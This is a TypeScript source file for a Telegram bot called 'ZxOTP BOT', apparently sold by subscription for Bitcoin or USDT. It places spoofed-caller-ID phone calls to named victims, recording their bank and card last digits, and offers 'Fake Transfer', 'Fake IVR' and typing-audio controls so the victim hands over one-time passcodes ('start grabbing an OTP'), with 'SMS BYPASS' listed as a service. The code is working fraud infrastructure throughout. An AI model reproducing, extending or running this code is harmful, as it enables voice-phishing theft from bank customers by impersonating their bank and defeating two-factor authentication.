          try { await b.telegram.deleteMessage(chatId, flow.lastBotMsgId); } catch { /* ignore */ }
        }
        try { await ctx.deleteMessage(); } catch { /* ignore */ }
        await placeCallNow(b, chatId, flow);
        resetFlow(chatId);
        return;
      }
    }
  });
}

// ── Review message builder ─────────────────────────────────────────────────────
function buildReviewMsg(flow: FlowState, scriptLbl: string, voiceLbl: string): Msg {
  const modeLabel = flow.callMode === 'dtmf' ? 'DTMF Keypad' : flow.callMode === 'both' ? 'Speech + DTMF' : 'Speech';
  return new Msg()
    .emoji(E.SATELLITE).sp().bold(`Review — ${flow.deviceName}`).nl(2)
    .emoji(E.PHONE).plain(' Target:     ').code(flow.VN).nl()
    .emoji(E.GLOBE).plain(' Caller ID:  ').italic(flow.UN || 'default').nl()
    .emoji(E.BANK).plain(' Bank:       ').italic(flow.BN || 'n/a').nl()
    .emoji(E.SPEAK).plain(' Name:       ').italic(flow.vicName || 'n/a').nl()
    .emoji(E.CARD).plain(' Card ends:  ').italic(flow.LD || 'n/a').nl()
    .emoji(E.ROBOT).plain(' Script:     ').italic(scriptLbl).nl()
    .emoji(E.STAR).plain(' Voice:      ').italic(voiceLbl).nl()
    .emoji(E.TOOLS).plain(' Mode:       ').bold(modeLabel).nl(2)
    .blockquote('Press /accept to place the call · /Decline to cancel\nChange script: /scripts · Change voice: /voices');
}

// ── Central call placer ────────────────────────────────────────────────────────
async function placeCallNow(b: Telegraf, chatId: number, flow: FlowState): Promise<void> {
  const hasTwilio = process.env['SIGNALWIRE_PROJECT_ID'] &&
                    process.env['SIGNALWIRE_API_TOKEN']  &&
                    process.env['SIGNALWIRE_FROM_NUMBER'];

  if (!hasTwilio) {
    const m = new Msg()
      .emoji(E.CANCEL).sp().bi('Call Failed — Twilio Not Configured').nl(2)
      .emoji(E.WARNING).sp().italic('SIGNALWIRE_PROJECT_ID, SIGNALWIRE_API_TOKEN and SIGNALWIRE_FROM_NUMBER must be set.').nl(2)
      .emoji(E.DIAMOND).plain(' Contact owner to configure: ').bold(OWNER_HANDLE);
    msgSend(b, chatId, m, {
      reply_markup: { inline_keyboard: [[btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)]] },
    });
    return;
  }

  const scriptId  = flow.scriptId ?? getActiveScript(chatId);
  const callMode  = flow.callMode ?? 'both';
  const voiceUrl  = callMode === 'dtmf'
    ? `${webhookBase()}/dtmf`
    : `${webhookBase()}/voice`;

  try {
    const callSid  = await makeCall(flow.VN, voiceUrl, flow.UN || undefined);
    createSession(chatId, flow.VN, callSid, scriptId, callMode as any, flow.UN || undefined);
    bumpCallStat(chatId);
    const username = getUser(chatId)?.username;
    logCall({ chatId, username, mode: flow.deviceName, phone: flow.VN, callSid, status: 'initiated', ts: Date.now() });

    // Save recall data
    lastCallMap.set(chatId, {
      VN: flow.VN, UN: flow.UN, BN: flow.BN, vicName: flow.vicName,
      LD: flow.LD, scriptId, voiceId: flow.voiceId, mode: flow.deviceName,
    });

    const modeIcon = callMode === 'dtmf' ? '🔢' : '🎙';
    const m = new Msg()
      .emoji(E.PHONE).sp().bold(`Calling ${flow.VN}…`).nl(2)
      .plain(modeIcon).plain(' Mode: ').bold(callMode === 'dtmf' ? 'DTMF Keypad — digits only' : 'Speech — listening for spoken response').nl()
      .emoji(E.GLOBE).plain(' Caller ID: ').italic(flow.UN || 'default').nl()
      .emoji(E.ROBOT).plain(' Script: ').italic(scriptId ? getScriptName(chatId, scriptId) : 'Default').nl(2)
      .emoji(E.ANNOUNCE).sp().italic("I'll notify you the moment the callee speaks or enters digits.").nl(2)
      .emoji(E.TOOLS).sp().bold('Live Call Controls:');
    msgSend(b, chatId, m, {
      reply_markup: {
        inline_keyboard: [
          [btn.red('Hang Up',           'hangup_now',      E.CANCEL),
           btn.blue('Hold (music)',      'ivr_hold',        E.ANNOUNCE)],
          [btn.teal('Fake Transfer',     'ivr_fake_xfer',   E.PHONE),
           btn.teal('Fake IVR',          'ivr_real_xfer',   E.ROBOT)],
          [btn.blue('BG Audio',          'ivr_bg_audio',    E.STAR),
           btn.blue('Typing Audio',      'ivr_typing_audio',E.TOOLS)],
        ],
      },
    } as any);
  } catch (err) {
    const errMsg = err instanceof Error ? err.message : String(err);
    logger.error({ err, errMsg }, 'makeCall failed');
    const m = new Msg()
      .emoji(E.CROSS).sp().bold('Call failed to connect.').nl(2)
      .code(errMsg.slice(0, 300)).nl(2)
      .italic('Use /call to try again.');
    msgSend(b, chatId, m);
  }
}

// ── Admin two-step prompt reply handler ───────────────────────────────────────

async function handleAdminPromptReply(
  b: Telegraf, chatId: number,
  pending: AdminPending, text: string, username?: string,
): Promise<void> {
  if (pending === 'revoke') {
    const targetId = Number(text.trim());
    const ok = Number.isFinite(targetId) && revokeUser(targetId);
    const m  = ok
      ? new Msg().emoji(E.CHECK).sp().bold(`License revoked for user ${targetId}.`)
      : new Msg().emoji(E.CROSS).sp().bold('No active license found for that user ID.');
    msgSend(b, chatId, m);

  } else if (pending === 'ban') {
    const targetId = Number(text.trim());
    if (!Number.isFinite(targetId)) {
      msgSend(b, chatId, new Msg().emoji(E.CROSS).sp().plain('Invalid user ID.'));
      return;
    }
    banUser(targetId);
    dbSetBanned(targetId, true);
    msgSend(b, chatId, new Msg().emoji(E.RED).sp().bold(`User ${targetId} has been banned.`));

  } else if (pending === 'unban') {
    const targetId = Number(text.trim());
    if (!Number.isFinite(targetId)) {
      msgSend(b, chatId, new Msg().emoji(E.CROSS).sp().plain('Invalid user ID.'));
      return;
    }
    unbanUser(targetId);
    dbSetBanned(targetId, false);
    msgSend(b, chatId, new Msg().emoji(E.CHECK).sp().bold(`User ${targetId} has been unbanned.`));

  } else if (pending === 'search') {
    const targetId = Number(text.trim());
    if (!Number.isFinite(targetId)) {
      msgSend(b, chatId, new Msg().emoji(E.CROSS).sp().plain('Invalid user ID.'));
      return;
    }
    const u    = getUser(targetId);
    const lic  = getUserLicense(targetId);
    const left = timeLeftMs(targetId);
    const m    = new Msg().emoji(E.SPEAK).sp().bi(`User ${targetId}`).nl(2);
    if (u) {
      m.emoji(E.ROBOT).plain(' Username: ').bold(u.username ? `@${u.username}` : 'n/a').nl()
       .emoji(E.STAR).plain(' First seen: ').plain(new Date(u.firstSeen).toUTCString()).nl()
       .emoji(E.STAR).plain(' Last seen:  ').plain(new Date(u.lastSeen).toUTCString()).nl()
       .emoji(E.RED).plain(' Banned: ').bold(isBanned(targetId) ? 'Yes' : 'No').nl();
    } else {
      m.italic('User not found in session store.').nl();
    }
    if (lic && left && left > 0) {
      m.nl().emoji(E.KEY).plain(' License: ').code(lic.key).nl()
       .emoji(E.HOURGLASS).plain(' Expires in: ').bold(formatDuration(left));
    } else {
      m.nl().emoji(E.CANCEL).plain(' No active license.');
    }
    msgSend(b, chatId, m);

  } else if (pending === 'token') {
    const newToken = text.trim();
    // Basic token format validation
    if (!/^\d{8,12}:[A-Za-z0-9_-]{30,50}$/.test(newToken)) {
      msgSend(b, chatId, new Msg()
        .emoji(E.CROSS).sp().bold('Invalid token format.').nl(2)
        .italic('Expected: 1234567890:ABCdef...').nl()
        .italic('Get your token from @BotFather on Telegram.').nl(2)
        .emoji(E.LOCK).sp().bold('Try again — send a valid bot token:'));
      adminPrompt.set(chatId, 'token'); // keep prompt open
      return;
    }
    // Mask token for display: show first 10 chars + partial secret
    const [tid, tsec = ''] = newToken.split(':');
    const masked = `${tid}:${tsec.slice(0, 6)}${'•'.repeat(Math.max(0, tsec.length - 6))}`;
    tokenDraft.set(chatId, newToken);
    adminPrompt.set(chatId, 'token_confirm');
    const m = new Msg()
      .emoji(E.LOCK).sp().bi('🔒 Confirm New Token').nl(2)
      .plain('Token received: ').code(masked).nl(2)
      .emoji(E.WARNING).sp().bold('This will replace the current bot token.').nl(2)
      .italic('Type ').bold('YES').italic(' to confirm and save, or ').bold('NO').italic(' to cancel:');
    msgSend(b, chatId, m);

  } else if (pending === 'token_confirm') {
    const draft = tokenDraft.get(chatId);
    tokenDraft.delete(chatId);
    if (!draft || text.trim().toUpperCase() !== 'YES') {
      msgSend(b, chatId, new Msg()
        .emoji(E.CANCEL).sp().bold('Token change cancelled.').nl(2)
        .italic('No changes were made. The existing token is still active.'));
      return;
    }
    await dbSetSetting('bot_token_override', draft);
    const m = new Msg()
      .emoji(E.CHECK).sp().bi('New Bot Token Saved').nl(2)
      .emoji(E.LOCK).sp().italic('Token stored securely in database.').nl(2)
      .emoji(E.WARNING).sp().bold('Restart the API server to apply the new token.').nl(2)
      .blockquote('The bot will reconnect to Telegram with the new identity on next restart.');
    msgSend(b, chatId, m);

  } else if (pending === 'setspoof_admin') {
    const num = text.trim();
    if (!num.startsWith('+') || !/^\+\d{7,15}$/.test(num.replace(/[\s\-()]/g, ''))) {
      msgSend(b, chatId, new Msg()
        .emoji(E.WARNING).sp().plain('Invalid format. Must start with + and country code, e.g. +12025551234'));
      return;
    }
    userSpoofNum.set(chatId, num);
    msgSend(b, chatId, new Msg()
      .emoji(E.CHECK).sp().bold('Default caller ID saved!').nl(2)
      .emoji(E.GLOBE).plain(' Spoof: ').code(num));

  } else if (pending === 'broadcast') {
    const users = allUsers();
    let sent = 0;
    for (const u of users) {
      if (isBanned(u.chatId)) continue;
      try {
        const m = new Msg().emoji(E.ANNOUNCE).sp().bi('Announcement').nl(2).plain(text);
        const { text: t, entities } = m.build();
        await b.telegram.sendMessage(u.chatId, t, { entities: entities as any });
        sent++;
      } catch { /* user may have blocked */ }
    }
    msgSend(b, chatId, new Msg().emoji(E.CHECK).sp().bold(`Broadcast sent to ${sent}/${users.length} users.`));
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// Inline-button actions
// ══════════════════════════════════════════════════════════════════════════════

function registerActions(b: Telegraf): void {

  // IVR ───────────────────────────────────────────────────────────────────────
  b.action('IVR-content', async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      await editOrSend(ctx, b, buildIvrContent(), {
        reply_markup: {
          inline_keyboard: [
            [btn.red('Hangup',              'ivr_hangup',       E.RED)],
            [btn.green('Place on hold',     'ivr_hold',         E.CHECK)],
            [btn.teal('Remove from hold',   'ivr_unhold',       E.CANCEL)],
            [btn.teal('Fake transfer',      'ivr_fake_xfer',    E.GLOBE)],
            [btn.blue('Transfer to IVR',    'ivr_real_xfer',    E.ROCKET)],
            [btn.gold('Fake IVR prompt',    'ivr_fake_prompt',  E.STAR)],
            [btn.blue('Background audio',   'ivr_bg_audio',     E.ANNOUNCE)],
            [btn.teal('Typing audio',       'ivr_typing_audio', E.TOOLS)],
          ],
        },
      });
    });
  });

  // ── Admin: generate keys ────────────────────────────────────────────────────
  async function adminGenKey(ctx: any, days: number, label: string) {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    const license = generateLicense(ctx.from!.id, days);
    dbUpsertLicense(license);
    const m = new Msg()
      .emoji(E.KEY).sp().bi(`New ${label} License Key`).nl(2)
      .code(license.key).nl(2)
      .emoji(E.HOURGLASS).sp().italic(`Valid for ${formatDuration(license.durationMs)} once redeemed.`).nl()
      .blockquote('Send this key to a customer. They activate it with /redeem <KEY>.');
    await editOrSend(ctx, b, m, {
      reply_markup: { inline_keyboard: [[btn.blue('Back to Admin', 'admin_panel', E.SHIELD)]] },
    });
  }

  b.action('admin_genkey1',   (ctx) => adminGenKey(ctx, 1,    '1-Day'));
  b.action('admin_genkey3',   (ctx) => adminGenKey(ctx, 3,    '3-Day'));
  b.action('admin_genkey7',   (ctx) => adminGenKey(ctx, 7,    'Weekly'));
  b.action('admin_genkey30',  (ctx) => adminGenKey(ctx, 30,   'Monthly'));
  b.action('admin_genkey_vip',(ctx) => adminGenKey(ctx, 3650, 'VIP Lifetime'));

  // Admin: back to panel ───────────────────────────────────────────────────────
  b.action('admin_panel', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    await editOrSend(ctx, b, buildAdminPanel(), { reply_markup: adminPanelKeyboard() } as any);
  });

  // Admin: search user prompt ───────────────────────────────────────────────────
  b.action('admin_search_prompt', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    adminPrompt.set(ctx.chat!.id, 'search');
    const m = new Msg().emoji(E.ROBOT).sp().bold('Send the numeric Telegram user ID to search:');
    await editOrSend(ctx, b, m);
  });

  // Admin: change bot token prompt — SECURE INPUT BOX ──────────────────────────
  b.action('admin_token_prompt', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    adminPrompt.set(ctx.chat!.id, 'token');
    const m = new Msg()
      .emoji(E.LOCK).sp().bi('🔒 Secure Token Input Box').nl(2)
      .blockquote('This is a private admin-only operation. Your token will never be logged or displayed.').nl(2)
      .emoji(E.KEY).sp().bold('Send the new bot token from @BotFather.').nl(2)
      .emoji(E.TOOLS).plain(' Format: ').code('1234567890:ABCDEFghijklMNOpqrsTUVwxyz123').nl(2)
      .blockquote('The new token will be saved to the database. Restart the API server to apply.');
    await editOrSend(ctx, b, m);
  });

  // Admin: list active keys ────────────────────────────────────────────────────
  b.action('admin_list', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    const active = listActiveLicenses();
    const m = new Msg().emoji(E.KEY).sp().bi('Active Licenses').nl(2);
    if (active.length === 0) {
      m.italic('No active licenses right now.');
    } else {
      for (const l of active.slice(0, 30)) {
        const left = l.expiresAt ? l.expiresAt - Date.now() : 0;
        m.emoji(E.CHECK).plain(' ').code(l.key).plain(` — user ${l.redeemedBy} — `).bold(formatDuration(left)).plain(' left').nl();
      }
      if (active.length > 30) m.nl().italic(`… and ${active.length - 30} more.`);
    }
    await editOrSend(ctx, b, m, {
      reply_markup: { inline_keyboard: [[btn.blue('Back to Admin', 'admin_panel', E.SHIELD)]] },
    });
  });

  // Admin: stats ───────────────────────────────────────────────────────────────
  b.action('admin_stats', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    const m = new Msg()
      .emoji(E.ROCKET).sp().bi('Bot Stats').nl(2)
      .emoji(E.STAR).plain(' Total users:     ').bold(String(userCount())).nl()
      .emoji(E.KEY).plain(' Active licenses: ').bold(String(listActiveLicenses().length)).nl()
      .emoji(E.RED).plain(' Banned users:    ').bold(String(allBanned().length)).nl()
      .emoji(E.PHONE).plain(' Calls logged:    ').bold(String(callLog.length)).nl()
      .emoji(E.SHIELD).plain(' Maintenance:     ').bold(maintenanceMode ? 'ON' : 'OFF');
    await editOrSend(ctx, b, m, {
      reply_markup: { inline_keyboard: [[btn.blue('Back to Admin', 'admin_panel', E.SHIELD)]] },
    });
  });

  // Admin: revoke ──────────────────────────────────────────────────────────────
  b.action('admin_revoke_prompt', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    adminPrompt.set(ctx.chat!.id, 'revoke');
    const m = new Msg().emoji(E.CANCEL).sp().bold('Send the numeric Telegram user ID to revoke:');
    await editOrSend(ctx, b, m);
  });

  // Admin: ban ─────────────────────────────────────────────────────────────────
  b.action('admin_ban_prompt', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    adminPrompt.set(ctx.chat!.id, 'ban');
    const m = new Msg().emoji(E.RED).sp().bold('Send the numeric Telegram user ID to ban:');
    await editOrSend(ctx, b, m);
  });

  // Admin: unban ───────────────────────────────────────────────────────────────
  b.action('admin_unban_prompt', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    adminPrompt.set(ctx.chat!.id, 'unban');
    const m = new Msg().emoji(E.CHECK).sp().bold('Send the numeric Telegram user ID to unban:');
    await editOrSend(ctx, b, m);
  });

  // Admin: list banned ─────────────────────────────────────────────────────────
  b.action('admin_banned_list', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    const banned = allBanned();
    const m = new Msg().emoji(E.SHIELD).sp().bi('Banned Users').nl(2);
    if (banned.length === 0) {
      m.italic('No banned users.');
    } else {
      for (const id of banned.slice(0, 50)) m.emoji(E.RED).plain(' ').code(String(id)).nl();
      if (banned.length > 50) m.nl().italic(`… and ${banned.length - 50} more.`);
    }
    await editOrSend(ctx, b, m, {
      reply_markup: { inline_keyboard: [[btn.blue('Back to Admin', 'admin_panel', E.SHIELD)]] },
    });
  });

  // Admin: maintenance toggle ───────────────────────────────────────────────────
  b.action('admin_maintenance', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    maintenanceMode = !maintenanceMode;
    dbSetSetting('maintenance', maintenanceMode ? '1' : '0');
    await ctx.answerCbQuery(`Maintenance mode is now ${maintenanceMode ? 'ON' : 'OFF'}`);
    await editOrSend(ctx, b, buildAdminPanel(), { reply_markup: adminPanelKeyboard() } as any);
  });

  // Admin: call logs ────────────────────────────────────────────────────────────
  b.action('admin_call_logs', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    // Prefer DB logs (durable), fall back to in-memory
    let dbLogs: Array<{ createdAt: Date; mode: string; phone: string; status: string }> = [];
    try { dbLogs = await dbRecentCallLogs(20) as any; } catch { /* ignore */ }
    const logs = dbLogs.length > 0 ? dbLogs : callLog.slice(0, 20).map(l => ({ ...l, createdAt: new Date(l.ts) }));
    const m    = new Msg().emoji(E.PHONE).sp().bi('Recent Call Logs').nl(2);
    if (logs.length === 0) {
      m.italic('No calls yet.');
    } else {
      for (const l of logs) {
        const time = new Date(l.createdAt).toISOString().slice(11, 19);
        m.emoji(E.CHECK).plain(` [${time}] `).bold(l.mode).plain(' → ').code(l.phone)
         .plain(` — ${l.status}`).nl();
      }
    }
    await editOrSend(ctx, b, m, {
      reply_markup: { inline_keyboard: [[btn.blue('Back to Admin', 'admin_panel', E.SHIELD)]] },
    });
  });

  // Admin: all users list ───────────────────────────────────────────────────────
  b.action('admin_users_list', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    const users = allUsers().slice(0, 40);
    const m     = new Msg().emoji(E.ROBOT).sp().bi(`All Users (${userCount()} total)`).nl(2);
    if (users.length === 0) {
      m.italic('No users yet.');
    } else {
      for (const u of users) {
        const tag = u.username ? `@${u.username}` : String(u.chatId);
        const lic = isPremium(u.chatId) ? ' ✅' : '';
        const ban = isBanned(u.chatId) ? ' 🔴' : '';
        m.emoji(E.STAR).plain(' ').code(String(u.chatId)).plain(` ${tag}${lic}${ban}`).nl();
      }
    }
    await editOrSend(ctx, b, m, {
      reply_markup: { inline_keyboard: [[btn.blue('Back to Admin', 'admin_panel', E.SHIELD)]] },
    });
  });

  // Admin: broadcast ────────────────────────────────────────────────────────────
  b.action('admin_broadcast_prompt', async (ctx) => {
    if (!isAdmin(ctx.from?.id)) { await ctx.answerCbQuery('Admins only.', { show_alert: true }); return; }
    await ctx.answerCbQuery();
    adminPrompt.set(ctx.chat!.id, 'broadcast');
    const m = new Msg().emoji(E.ANNOUNCE).sp().bold('Send the message to broadcast to all users:');
    await editOrSend(ctx, b, m);
  });

  // BTC ────────────────────────────────────────────────────────────────────────
  b.action('BTC', async (ctx) => {
    await ctx.answerCbQuery();
    const cap = new Msg()
      .emoji(E.FIRE).sp().bold('Bitcoin (BTC)').nl()
      .code(BTC_ADDR).nl(2)
      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
    const { text, entities } = cap.build();
    try {
      await ctx.deleteMessage();
    } catch { /* ignore */ }
    try {
      await ctx.replyWithPhoto(
        { source: createReadStream(BTC_QR) },
        {
          caption: text,
          caption_entities: entities as any,
          reply_markup: { inline_keyboard: [[btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)]] },
        },
      );
    } catch {
      b.telegram.sendMessage(ctx.chat!.id, text, { entities: entities as any });
    }
  });

  // TRC20 ──────────────────────────────────────────────────────────────────────
  b.action('TRC', async (ctx) => {
    await ctx.answerCbQuery();
    const cap = new Msg()
      .emoji(E.CHECK).sp().bold('USDT — TRON (TRC20)').nl()
      .code(TRC20_ADDR).nl(2)
      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
    const { text, entities } = cap.build();
    try {
      await ctx.deleteMessage();
    } catch { /* ignore */ }
    try {
      await ctx.replyWithPhoto(
        { source: createReadStream(TRC20_QR) },
        {
          caption: text,
          caption_entities: entities as any,
          reply_markup: { inline_keyboard: [[btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)]] },
        },
      );
    } catch {
      b.telegram.sendMessage(ctx.chat!.id, text, { entities: entities as any });
    }
  });

  // SL ─────────────────────────────────────────────────────────────────────────
  b.action('SL', async (ctx) => {
    await ctx.answerCbQuery();
    const m = new Msg()
      .emoji(E.STAR).sp().italic('click /subscribe to see subscriptions').nl(2)
      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
    await editOrSend(ctx, b, m, {
      reply_markup: { inline_keyboard: [[btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)]] },
    });
  });

  // IVR redirect (legacy 'IRV' callback — open panel directly) ─────────────────
  b.action('IRV', async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      await editOrSend(ctx, b, buildIvrContent(), {
        reply_markup: {
          inline_keyboard: [
            [btn.red('Hangup',              'ivr_hangup',       E.RED)],
            [btn.green('Place on hold',     'ivr_hold',         E.CHECK)],
            [btn.teal('Remove from hold',   'ivr_unhold',       E.CANCEL)],
            [btn.teal('Fake transfer',      'ivr_fake_xfer',    E.GLOBE)],
            [btn.blue('Transfer to IVR',    'ivr_real_xfer',    E.ROCKET)],
            [btn.gold('Fake IVR prompt',    'ivr_fake_prompt',  E.STAR)],
            [btn.blue('Background audio',   'ivr_bg_audio',     E.ANNOUNCE)],
            [btn.teal('Typing audio',       'ivr_typing_audio', E.TOOLS)],
          ],
        },
      });
    });
  });

  // ── Service info actions ──────────────────────────────────────────────────────
  b.action('service_info', async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx, b, buildServiceInfoMenu(), {
      reply_markup: {
        inline_keyboard: [
          [btn.gold('BANK',       'svc_1', E.BANK)],
          [btn.blue('SMS BYPASS', 'svc_2', E.PHONE)],
          [btn.green('PAY',       'svc_3', E.MONEY)],
          [btn.teal('ACCOUNT',    'svc_4', E.ROBOT)],
          [btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)],
        ],
      },
    });
  });

  for (const n of [1, 2, 3, 4] as const) {
    b.action(`svc_${n}`, async (ctx) => {
      await ctx.answerCbQuery();
      const { msg, keyboard } = buildServiceDetail(n);
      await editOrSend(ctx, b, msg, { reply_markup: keyboard });
    });
  }

  // Payment ────────────────────────────────────────────────────────────────────
  b.action('payment', async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx, b, buildPaymentMenu(), {
      reply_markup: {
        inline_keyboard: [
          [btn.gold('VIP Lifetime — ' + PRICE_VIP, 'payment_confirm', E.CROWN)],
          [btn.blue('Yearly — '       + PRICE_YR,  'payment_confirm', E.ROCKET)],
          [btn.green('Monthly — '     + PRICE_MO,  'payment_confirm', E.STAR)],
          [btn.teal('Weekly — '       + PRICE_WK,  'payment_confirm', E.LIGHTNING)],
          [btn.blue('3 Days — '       + PRICE_3D,  'payment_confirm', E.HOURGLASS)],
          [btn.url('Contact Owner',    OWNER_URL,              E.ENVELOPE)],
        ],
      },
    });
  });

  b.action('payment_confirm', async (ctx) => {
    await ctx.answerCbQuery();
    const m = new Msg()
      .emoji(E.MONEY).sp().bi('Select Payment Method').nl(2)
      .emoji(E.CARD).sp().italic('Choose your wallet to make payment fast').nl(2)
      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
    await editOrSend(ctx, b, m, {
      reply_markup: {
        inline_keyboard: [
          [btn.gold('Bitcoin (BTC)', 'BTC', E.FIRE)],
          [btn.green('USDT TRC20',  'TRC', E.CHECK)],
          [btn.url('Contact Owner',  OWNER_URL, E.ENVELOPE)],
        ],
      },
    });
  });

  // Admin contact (non-admin view) ─────────────────────────────────────────────
  b.action('admin', async (ctx) => {
    await ctx.answerCbQuery();
    const m = new Msg()
      .emoji(E.SPEAK).sp().bold('Admin Contact').nl(2)
      .plain('Click ').bold(OWNER_HANDLE).plain(' for admin help and complaints.');
    await editOrSend(ctx, b, m, {
      reply_markup: { inline_keyboard: [[btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)]] },
    });
  });

  // Subscription ───────────────────────────────────────────────────────────────
  b.action('subscription', async (ctx) => {
    await ctx.answerCbQuery();
    const m = new Msg()
      .emoji(E.FIRE).sp().bold("Don't miss out on the best offers!").nl(2)
      .emoji(E.ROCKET).sp().italic('Use /subscribe_type to see subscriptions').nl(2)
      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
    await editOrSend(ctx, b, m, {
      reply_markup: {
        inline_keyboard: [
          [btn.gold('VIP Lifetime — ' + PRICE_VIP, 'payment', E.CROWN)],
          [btn.blue('Yearly — '       + PRICE_YR,  'payment', E.ROCKET)],
          [btn.green('Monthly — '     + PRICE_MO,  'payment', E.STAR)],
          [btn.teal('Weekly — '       + PRICE_WK,  'payment', E.LIGHTNING)],
          [btn.blue('3 Days — '       + PRICE_3D,  'payment', E.HOURGLASS)],
          [btn.url('Contact Owner',    OWNER_URL,             E.ENVELOPE)],
        ],
      },
    });
  });

  // Cmds Encyclopaedia — page 1 ─────────────────────────────────────────────────
  b.action('more-C', async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx, b, buildCmdGuideP1(), {
      reply_markup: {
        inline_keyboard: [
          [btn.blue('Next → Page 2',   'guide_p2',    E.ROCKET),
           btn.teal('Services Info',   'service_info', E.STAR)],
          [btn.teal('← Back to Menu',  'info_panel',  E.CANCEL)],
        ],
      },
    });
  });

  // Cmds Encyclopaedia — page 2 ─────────────────────────────────────────────────
  b.action('guide_p2', async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx, b, buildCmdGuideP2(), {
      reply_markup: {
        inline_keyboard: [
          [btn.teal('← Page 1',        'more-C',      E.CANCEL),
           btn.blue('Services Info',   'service_info', E.STAR)],
          [btn.teal('← Back to Menu',  'info_panel',  E.CANCEL)],
        ],
      },
    });
  });

  // Command guide (alias — same as more-C page 1) ──────────────────────────────
  b.action('Command_GUIDE', async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx, b, buildCmdGuideP1(), {
      reply_markup: {
        inline_keyboard: [
          [btn.blue('Next → Page 2',   'guide_p2',    E.ROCKET),
           btn.teal('Services Info',   'service_info', E.STAR)],
          [btn.teal('← Back to Menu',  'info_panel',  E.CANCEL)],
        ],
      },
    });
  });

  // Premium placeholder (start grabbing / FAQ / receipts) ──────────────────────
  b.action('reply-erro', async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      const m = new Msg()
        .emoji(E.CHECK).sp().bi('Feature Unlocked').nl(2)
        .italic('Use /call to start grabbing an OTP now.');
      await editOrSend(ctx, b, m);
    });
  });

  // Features ───────────────────────────────────────────────────────────────────
  b.action('features', async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx, b, buildFeatures(), {
      reply_markup: { inline_keyboard: [[btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)]] },
    });
  });

  // Channel ────────────────────────────────────────────────────────────────────
  b.action('channel', async (ctx) => {
    await ctx.answerCbQuery();
    const m = new Msg()
      .emoji(E.ROCKET).sp().bi('ZxOTP BOT').nl(2)
      .italic('Contact the owner for channel info:').nl()
      .emoji(E.DIAMOND).plain(' ').bold(OWNER_HANDLE);
    await editOrSend(ctx, b, m, {
      reply_markup: { inline_keyboard: [[btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)]] },
    });
  });

  b.action('VOUCHES', async (ctx) => {
    await ctx.answerCbQuery();
    const m = new Msg()
      .emoji(E.TROPHY).sp().bi('ZxOTP BOT — Vouches').nl(2)
      .italic('Contact the owner for vouches:').nl()
      .emoji(E.DIAMOND).plain(' ').bold(OWNER_HANDLE);
    await editOrSend(ctx, b, m, {
      reply_markup: { inline_keyboard: [[btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)]] },
    });
  });

  // Support ────────────────────────────────────────────────────────────────────
  b.action('support', async (ctx) => {
    await ctx.answerCbQuery();
    const m = new Msg().emoji(E.SHIELD).sp().plain('Use /support for supported countries');
    await editOrSend(ctx, b, m);
  });

  // Site ───────────────────────────────────────────────────────────────────────
  b.action('site-respons', async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      const m = new Msg()
        .emoji(E.GLOBE).sp().italic('The site will be active soon').nl(2)
        .blockquote('Please contact /admin for more info');
      await editOrSend(ctx, b, m, {
        reply_markup: { inline_keyboard: [[btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)]] },
      });
    });
  });

  // ── Script & Voice actions ────────────────────────────────────────────────────

  // Browse script categories
